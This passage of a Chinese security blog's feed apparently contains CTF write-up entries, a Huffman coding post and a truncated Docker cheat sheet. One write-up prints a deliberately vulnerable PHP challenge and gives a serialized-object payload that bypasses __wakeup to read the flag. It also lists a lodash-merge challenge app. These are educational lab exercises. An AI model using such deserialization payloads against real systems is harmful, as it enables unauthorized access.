basename(__filename))</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">main()</span><br></pre></td></tr></table></figure><h4 id="预备知识-2"><a href="#预备知识-2" class="headerlink" title="预备知识"></a>预备知识</h4><h4 id="目标-3"><a href="#目标-3" class="headerlink" title="目标"></a>目标</h4><h4 id="阻碍-3"><a href="#阻碍-3" class="headerlink" title="阻碍"></a>阻碍</h4><h4 id="解决方法-4"><a href="#解决方法-4" class="headerlink" title="解决方法"></a>解决方法</h4><h2 id="6-medium-javacon"><a href="#6-medium-javacon" class="headerlink" title="6.medium - javacon"></a>6.medium - javacon</h2><blockquote><p>SPEL 表达式沙盒绕过</p></blockquote><h4 id="预备知识-3"><a href="#预备知识-3" class="headerlink" title="预备知识"></a>预备知识</h4><h4 id="目标-4"><a href="#目标-4" class="headerlink" title="目标"></a>目标</h4><h4 id="阻碍-4"><a href="#阻碍-4" class="headerlink" title="阻碍"></a>阻碍</h4><h4 id="解决方法-5"><a href="#解决方法-5" class="headerlink" title="解决方法"></a>解决方法</h4><h2 id="7-medium-lumenserial"><a href="#7-medium-lumenserial" class="headerlink" title="7.medium - lumenserial"></a>7.medium - lumenserial</h2><blockquote><p>反序列化在 PHP 7.2 下的利用</p></blockquote><h4 id="预备知识-4"><a href="#预备知识-4" class="headerlink" title="预备知识"></a>预备知识</h4><h4 id="目标-5"><a href="#目标-5" class="headerlink" title="目标"></a>目标</h4><h4 id="阻碍-5"><a href="#阻碍-5" class="headerlink" title="阻碍"></a>阻碍</h4><h4 id="解决方法-6"><a href="#解决方法-6" class="headerlink" title="解决方法"></a>解决方法</h4><h2 id="8-hard-picklecode"><a href="#8-hard-picklecode" class="headerlink" title="8.hard - picklecode"></a>8.hard - picklecode</h2><blockquote><p>Python 反序列化沙盒绕过</p></blockquote><h4 id="预备知识-5"><a href="#预备知识-5" class="headerlink" title="预备知识"></a>预备知识</h4><h4 id="目标-6"><a href="#目标-6" class="headerlink" title="目标"></a>目标</h4><h4 id="阻碍-6"><a href="#阻碍-6" class="headerlink" title="阻碍"></a>阻碍</h4><h4 id="解决方法-7"><a href="#解决方法-7" class="headerlink" title="解决方法"></a>解决方法</h4><h2 id="9-hard-thejs"><a href="#9-hard-thejs" class="headerlink" title="9.hard - thejs"></a>9.hard - thejs</h2><blockquote><p>JavaScript 对象特性利用</p></blockquote><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> fs = <span class="built_in">require</span>(<span class="string">'fs'</span>)</span><br><span class="line"><span class="keyword">const</span> express = <span class="built_in">require</span>(<span class="string">'express'</span>)</span><br><span class="line"><span class="keyword">const</span> bodyParser = <span class="built_in">require</span>(<span class="string">'body-parser'</span>)</span><br><span class="line"><span class="keyword">const</span> lodash = <span class="built_in">require</span>(<span class="string">'lodash'</span>)</span><br><span class="line"><span class="keyword">const</span> session = <span class="built_in">require</span>(<span class="string">'express-session'</span>)</span><br><span class="line"><span class="keyword">const</span> randomize = <span class="built_in">require</span>(<span class="string">'randomatic'</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> app = express()</span><br><span class="line">app.use(bodyParser.urlencoded(&#123;<span class="attr">extended</span>: <span class="literal">true</span>&#125;)).use(bodyParser.json()) <span class="comment">//对post请求的请求体进行解析</span></span><br><span class="line">app.use(<span class="string">'/static'</span>, express.static(<span class="string">'static'</span>))</span><br><span class="line">app.use(session(&#123;</span><br><span class="line">    name: <span class="string">'thejs.session'</span>,</span><br><span class="line">    secret: randomize(<span class="string">'aA0'</span>, <span class="number">16</span>), <span class="comment">// 随机数</span></span><br><span class="line">    resave: <span class="literal">false</span>,</span><br><span class="line">    saveUninitialized: <span class="literal">false</span></span><br><span class="line">&#125;))</span><br><span class="line">app.engine(<span class="string">'ejs'</span>, <span class="function"><span class="keyword">function</span> (<span class="params">filePath, options, callback</span>) </span>&#123; <span class="comment">// 模板引擎</span></span><br><span class="line">    fs.readFile(filePath, (err, content) =&gt; &#123;   <span class="comment">//读文件 filepath</span></span><br><span class="line">        <span class="keyword">if</span> (err) <span class="keyword">return</span> callback(<span class="keyword">new</span> <span class="built_in">Error</span>(err))</span><br><span class="line">        <span class="keyword">let</span> compiled = lodash.template(content)  <span class="comment">//模板化</span></span><br><span class="line">        <span class="keyword">let</span> rendered = compiled(&#123;...options&#125;)   <span class="comment">//动态引入变量</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> callback(<span class="literal">null</span>, rendered)</span><br><span class="line">    &#125;)</span><br><span class="line">&#125;)</span><br><span class="line">app.set(<span class="string">'views'</span>, <span class="string">'./views'</span>)</span><br><span class="line">app.set(<span class="string">'view engine'</span>, <span class="string">'ejs'</span>)</span><br><span class="line"></span><br><span class="line">app.all(<span class="string">'/'</span>, (req, res) =&gt; &#123;</span><br><span class="line">    <span class="keyword">let</span> data = req.session.data || &#123;<span class="attr">language</span>: [], <span class="attr">category</span>: []&#125;</span><br><span class="line">    <span class="keyword">if</span> (req.method == <span class="string">'POST'</span>) &#123;</span><br><span class="line">        data = lodash.merge(data, req.body) <span class="comment">// merge 合并字典</span></span><br><span class="line">        req.session.data = data</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    res.render(<span class="string">'index'</span>, &#123;</span><br><span class="line">        language: data.language, </span><br><span class="line">        category: data.category</span><br><span class="line">    &#125;)</span><br><span class="line">&#125;)</span><br><span class="line"></span><br><span class="line">app.listen(<span class="number">3000</span>, () =&gt; <span class="built_in">console</span>.log(<span class="string">`Example app listening on port 3000!`</span>))</span><br></pre></td></tr></table></figure><h4 id="预备知识-6"><a href="#预备知识-6" class="headerlink" title="预备知识"></a>预备知识</h4><h4 id="目标-7"><a href="#目标-7" class="headerlink" title="目标"></a>目标</h4><h4 id="阻碍-7"><a href="#阻碍-7" class="headerlink" title="阻碍"></a>阻碍</h4><h4 id="解决方法-8"><a href="#解决方法-8" class="headerlink" title="解决方法"></a>解决方法</h4>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;1-easy-function&quot;&gt;&lt;a href=&quot;#1-easy-function&quot; class=&quot;headerlink&quot; title=&quot;1.easy - function&quot;&gt;&lt;/a&gt;1.easy - function&lt;/h2&gt;&lt;blockquote&gt;
&lt;p&gt;P
      
    
    </summary>
    
    
      <category term="Writeup" scheme="https://wywwzjj.top/tags/Writeup/"/>
    
      <category term="代码审计" scheme="https://wywwzjj.top/tags/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/"/>
    
  </entry>
  
  <entry>
    <title>优雅实现哈夫曼编码</title>
    <link href="https://wywwzjj.top/2018/12/22/%E4%BC%98%E9%9B%85%E5%AE%9E%E7%8E%B0%E5%93%88%E5%A4%AB%E6%9B%BC%E7%BC%96%E7%A0%81/"/>
    <id>https://wywwzjj.top/2018/12/22/优雅实现哈夫曼编码/</id>
    <published>2018-12-22T05:05:00.000Z</published>
    <updated>2019-04-04T10:30:19.119Z</updated>
    
    <content type="html"><![CDATA[<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;bits/stdc++.h&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> <span class="built_in">std</span>;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">Node</span> &#123;</span></span><br><span class="line">    <span class="keyword">char</span> data;</span><br><span class="line">    <span class="keyword">int</span> freq;</span><br><span class="line">    Node *lChild, *rChild;</span><br><span class="line"></span><br><span class="line">    Node(<span class="keyword">char</span> data, <span class="keyword">int</span> freq) : data(data), freq(freq) &#123;</span><br><span class="line">        lChild = rChild = <span class="literal">NULL</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 仿函数，给极小化堆用</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">cmp</span> &#123;</span></span><br><span class="line">    <span class="function"><span class="keyword">bool</span> <span class="title">operator</span><span class="params">()</span> <span class="params">(<span class="keyword">const</span> Node* a, <span class="keyword">const</span> Node* b)</span></span>&#123;</span><br><span class="line">        <span class="keyword">return</span> a-&gt;freq &gt; b-&gt;freq;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">print</span><span class="params">(Node* root, <span class="built_in">string</span> str)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(root == <span class="literal">NULL</span>) <span class="keyword">return</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(root-&gt;data != <span class="string">'#'</span>)  <span class="comment">// 有数据才打印</span></span><br><span class="line">        <span class="built_in">cout</span>&lt;&lt;root-&gt;data&lt;&lt;<span class="string">": "</span>&lt;&lt;str&lt;&lt;<span class="built_in">endl</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 左0右1</span></span><br><span class="line">    print(root-&gt;lChild, str + <span class="string">'0'</span>);</span><br><span class="line">    print(root-&gt;rChild, str + <span class="string">'1'</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">Huffman</span><span class="params">(<span class="keyword">char</span>* data, <span class="keyword">int</span>* freq, <span class="keyword">int</span> n)</span> </span>&#123;</span><br><span class="line">    priority_queue&lt;Node*, <span class="built_in">vector</span>&lt;Node*&gt;, cmp&gt; pq;  <span class="comment">// 建立极小化堆</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; n; i++)</span><br><span class="line">        pq.push(<span class="keyword">new</span> Node(data[i], freq[i]));  <span class="comment">// 把指针存进去</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">while</span>(pq.size() &gt; <span class="number">1</span>) &#123;</span><br><span class="line">        <span class="comment">// 取最小的两个</span></span><br><span class="line">        Node* left = pq.top(); pq.pop();</span><br><span class="line">        Node* right = pq.top(); pq.pop();</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 合并为一个，权重相加，‘#’作为一个标志，非叶节点，无数据</span></span><br><span class="line">        Node* top = <span class="keyword">new</span> Node(<span class="string">'#'</span>, left-&gt;freq + right-&gt;freq);</span><br><span class="line"></span><br><span class="line">        top-&gt;lChild = left;</span><br><span class="line">        top-&gt;rChild = right;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 再投入堆中</span></span><br><span class="line">        pq.push(top);</span><br><span class="line">    &#125;</span><br><span class="line">    print(pq.top(), <span class="string">""</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="built_in">cout</span>&lt;&lt;<span class="string">"请输入字符个数"</span>&lt;&lt;<span class="built_in">endl</span>;</span><br><span class="line">    <span class="keyword">int</span> n; <span class="built_in">cin</span>&gt;&gt;n;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">char</span>* data = <span class="keyword">new</span> <span class="keyword">char</span>[n+<span class="number">5</span>];</span><br><span class="line">    <span class="keyword">int</span>* freq = <span class="keyword">new</span> <span class="keyword">int</span>[n+<span class="number">5</span>];</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; n; i++) &#123;</span><br><span class="line">        <span class="built_in">cout</span>&lt;&lt;<span class="string">"请输入字符及对应的权重："</span>&lt;&lt;<span class="built_in">endl</span>;</span><br><span class="line">        <span class="built_in">cin</span>&gt;&gt;data[i]&gt;&gt;freq[i];</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    Huffman(data, freq, n);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">delete</span>(data);</span><br><span class="line">    <span class="keyword">delete</span>(freq);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      
      
        &lt;figure class=&quot;highlight c++&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;
      
    
    </summary>
    
    
      <category term="算法" scheme="https://wywwzjj.top/tags/%E7%AE%97%E6%B3%95/"/>
    
  </entry>
  
  <entry>
    <title>Please don&#39;t stop rua 233333</title>
    <link href="https://wywwzjj.top/2018/12/08/Please_don&#39;t_stop_rua_233333/"/>
    <id>https://wywwzjj.top/2018/12/08/Please_don&#39;t_stop_rua_233333/</id>
    <published>2018-12-08T10:09:27.000Z</published>
    <updated>2019-02-28T09:02:33.988Z</updated>
    
    <content type="html"><![CDATA[<p><a href="http://123.206.31.85:10012/" target="_blank" rel="noopener">原题网址</a></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Time</span></span>&#123;</span><br><span class="line"><span class="keyword">public</span> $flag = xxxxx;</span><br><span class="line"><span class="keyword">public</span> $truepassword = xxxxx;</span><br><span class="line"><span class="keyword">public</span> $time;</span><br><span class="line">    <span class="keyword">public</span> $password;</span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">construct</span><span class="params">($tt, $pp)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;time = $tt;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;password = $pp;</span><br><span class="line">    &#125;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">__destruct</span><span class="params">()</span></span>&#123;</span><br><span class="line"><span class="keyword">if</span>(!<span class="keyword">empty</span>(<span class="keyword">$this</span>-&gt;password)) &#123;</span><br><span class="line"><span class="keyword">if</span>(strcmp(<span class="keyword">$this</span>-&gt;password,<span class="keyword">$this</span>-&gt;truepassword)==<span class="number">0</span>)&#123;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"&lt;h1&gt;Welcome,you need to wait......&lt;br&gt;The flag will become soon....&lt;/h1&gt;&lt;br&gt;"</span>;</span><br><span class="line"><span class="keyword">if</span>(!<span class="keyword">empty</span>(<span class="keyword">$this</span>-&gt;time))&#123;</span><br><span class="line"><span class="keyword">if</span>(!is_numeric(<span class="keyword">$this</span>-&gt;time))&#123;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">'Sorry.&lt;br&gt;'</span>;</span><br><span class="line">show_source(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span> <span class="keyword">if</span>(<span class="keyword">$this</span>-&gt;time &lt; <span class="number">11</span> * <span class="number">22</span> * <span class="number">33</span> * <span class="number">44</span> * <span class="number">55</span> * <span class="number">66</span>)&#123;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">'you need a bigger time.&lt;br&gt;'</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span> <span class="keyword">if</span>(<span class="keyword">$this</span>-&gt;time &gt; <span class="number">66</span> * <span class="number">55</span> * <span class="number">44</span> * <span class="number">33</span> * <span class="number">23</span> * <span class="number">11</span>)&#123;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">'you need a smaller time.&lt;br&gt;'</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line">sleep((int)<span class="keyword">$this</span>-&gt;time);</span><br><span class="line">var_dump(<span class="keyword">$this</span>-&gt;flag);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">'&lt;hr&gt;'</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">'&lt;h1&gt;you have no time!!!!!&lt;/h1&gt;&lt;br&gt;'</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">'&lt;h1&gt;Password is wrong............&lt;/h1&gt;&lt;br&gt;'</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"&lt;h1&gt;Please input password..........&lt;/h1&gt;&lt;br&gt;"</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span><span class="params">()</span></span>&#123;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">'hello hacker,I have changed your password and time, rua!'</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">'rua'</span>]))&#123;</span><br><span class="line">    <span class="comment">//$test = new Time(1.275523920, array("a"));</span></span><br><span class="line">$rua = $_GET[<span class="string">'rua'</span>];</span><br><span class="line">@unserialize($rua);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"&lt;h1&gt;Please don't stop rua 233333&lt;/h1&gt;&lt;br&gt;"</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>稍稍记录一下，简单的反序列化。</p><p><strong>何为序列化？</strong></p><blockquote><p>序列化对象 - 在会话中存放对象 ¶<br>所有 php 里面的值都可以使用函数 serialize() 来返回一个包含字节流的字符串来表示。unserialize() 函数能够重新把字符串变回 php 原来的值。 序列化一个对象将会保存对象的所有变量，但是不会保存对象的方法，只会保存类的名字。<br>为了能够unserialize()一个对象，这个对象的类必须已经定义过。如果序列化类A的一个对象，将会返回一个跟类A相关，而且包含了对象所有变量值的字符串。 如果要想在另外一个文件中解序列化一个对象，这个对象的类必须在解序列化之前定义，可以通过包含一个定义该类的文件或使用函数spl_autoload_register()来实现。</p></blockquote><p>序列化字符串格式：<strong>变量类型：变量长度：变量内容</strong><br>例如序列化对象字符串：</p><blockquote><p>变量类型：类名长度：类名：属性数量：{属性类型：属性名长度：属性名；属性值类型：属性值长度：属性值内容}</p></blockquote><p><strong>PHP 中的魔术方法（Magic methods）</strong><br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">__construct()， __destruct()， __call()， __callStatic()， __get()， __set()， __isset()， __unset()， </span><br><span class="line">__sleep()， __wakeup()， __toString()， __invoke()， __set_state()， __clone()，__debugInfo()</span><br></pre></td></tr></table></figure></p><p>这里我们着重关注几个：</p><ul><li><code>__construct()</code>：当对象创建(new)时会自动调用。但在unserialize()时是不会自动调用的。</li><li><code>__destruct()</code>：当对象被销毁时会自动调用。</li><li><code>__sleep()</code>：serialize() 会检查类中是否存在一个魔术方法 __sleep()。若存在，该方法会先被调用，再执行序列化操作</li><li><code>__wakeup()</code>：unserialize() 会检查是否存在一个 <strong>wakeup() 方法。若存在，则先调用 </strong>wakeup 方法，预先准备对象需要的资源。</li><li><code>__toString()</code>：用于一个类被当成字符串时应怎样回应。例如 <code>echo $obj;</code> 应该显示些什么。</li></ul><p>PHP 有个 Bug，该漏洞可以概括为：</p><blockquote><p>当序列化字符串中表示对象个数的值大于真实的属性个数时会跳过 __wakeup 函数的执行<br><figure class="highlight ini"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">rua</span>=O:<span class="number">4</span>:<span class="string">"Time"</span>:<span class="number">3</span>:&#123;</span><br></pre></td></tr></table></figure></p></blockquote><p>注意上面的 3 ，是属性数量，本来2个就够了。</p><p>16进制 <code>0x</code> 开头在强制转换中出现问题，导致转换成0</p><p>payload 如下：<br><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">rua</span>=O:4:<span class="number">%22</span>Time<span class="number">%22</span>:4:&#123;s:4:<span class="number">%22</span>time<span class="number">%22</span>;s:10:<span class="number">%220</span>x4c06f350<span class="number">%22</span>;s:8:<span class="number">%22</span>password<span class="number">%22</span>;a:2:&#123;i:0;s:1:<span class="number">%22</span>a<span class="number">%22</span>;i:1;s:1:<span class="number">%22</span>b<span class="number">%22</span>;&#125;&#125;</span><br></pre></td></tr></table></figure></p><p>还有一种办法：科学计数法绕过 sleep()<br><figure class="highlight groovy"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">rua=<span class="string">O:</span><span class="number">4</span>:<span class="string">"Time"</span>:<span class="number">3</span>:&#123;<span class="string">s:</span><span class="number">4</span>:<span class="string">"time"</span>;<span class="string">s:</span><span class="number">5</span>:<span class="string">"1.3e9"</span>;</span><br></pre></td></tr></table></figure></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;&lt;a href=&quot;http://123.206.31.85:10012/&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;原题网址&lt;/a&gt;&lt;/p&gt;
&lt;figure class=&quot;highlight php&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gut
      
    
    </summary>
    
    
      <category term="Writeup" scheme="https://wywwzjj.top/tags/Writeup/"/>
    
      <category term="反序列化" scheme="https://wywwzjj.top/tags/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/"/>
    
  </entry>
  
  <entry>
    <title>Docker-常用命令清单</title>
    <link href="https://wywwzjj.top/2018/11/30/Docker-%E5%B8%B8%E7%94%A8%E5%91%BD%E4%BB%A4/"/>
    <id>https://wywwzjj.top/2018/11/30/Docker-常用命令/</id>
    <published>2018-11-30T04:43:26.000Z</published>
    <updated>2019-03-20T05:18:47.814Z</updated>
    
    <content type="html"><![CDATA[<h2 id="基本概念"><a href="#基本概念" class="headerlink" title="基本概念"></a>基本概念</h2><p>一个 <strong>Docker Registry</strong> 中可以包含多个 <strong>仓库（Repository）</strong></p><p>每个仓库可以包含多个<strong>标签（Tag）</strong>，每个标签对应一个镜像</p><p><code>镜像</code>和<code>容器</code>的关系，就像<code>类</code>与<code>对象</code></p><h2 id="安装"><a href="#安装" class="headerlink" title="安装"></a>安装</h2><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash"> 更新相关软件</span></span><br><span class="line">sudo apt update</span><br><span class="line">sudo apt install apt-transport-https ca-certificates curl software-properties-common</span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash"> 添加Docker源</span></span><br><span class="line">curl -fsSL https://download.docker.com/linux/ubuntu/gpg | sudo apt-key add -</span><br><span class="line">sudo add-apt-repository "deb [arch=amd64] https://download.docker.com/linux/ubuntu bionic stable"</span><br><span class="line"></span><br><span class="line">sudo apt update</span><br><span class="line">apt-cache policy docker-ce</span><br><span class="line"><span class="meta">#</span><span class="bash"> 下面是安装信息：</span></span><br><span class="line">docker-ce:</span><br><span class="line">  Installed: (none)</span><br><span class="line">  Candidate: 18.06.1~ce~3-0~ubuntu</span><br><span class="line">  Version table:</span><br><span class="line">     18.06.1~ce~3-0~ubuntu 500</span><br><span class="line">        500 https://download.docker.com/linux/ubuntu bionic/stable amd64 Packages</span><br><span class="line">     18.06.0~ce~3-0~ubuntu 500</span><br><span class="line">        500 https://download.docker.com/linux/ubuntu bionic/stable amd64 Packages</span><br><span class="line">     18.03.1~ce~3-0~ubuntu 500</span><br><span class="line">        500 https://download.docker.com/linux/ubuntu bionic/stable amd64 Packages</span><br><span class="line">        </span><br><span class="line"><span class="meta">#</span><span class="bash"> 正式安装</span></span><br><span class="line">sudo apt install docker-ce</span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash"> 查看运行状态</span></span><br><span class="line">sudo systemctl status docker</span><br></pre></td></tr></table></figure><h2 id="基本使用"><a href="#基本使用" class="headerlink" title="基本使用"></a>基本使用</h2><p><strong>Docker也遵守Linux命令的格式</strong></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">docker [option] [command] [arguments]</span><br><span class="line"></span><br><span class="line">docker search ubuntu  # 查找镜像</span><br><span class="line">docker pull name# 下载image</span><br><span class="line">docker push # 推送镜像</span><br></pre></td></tr></table></figure><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span 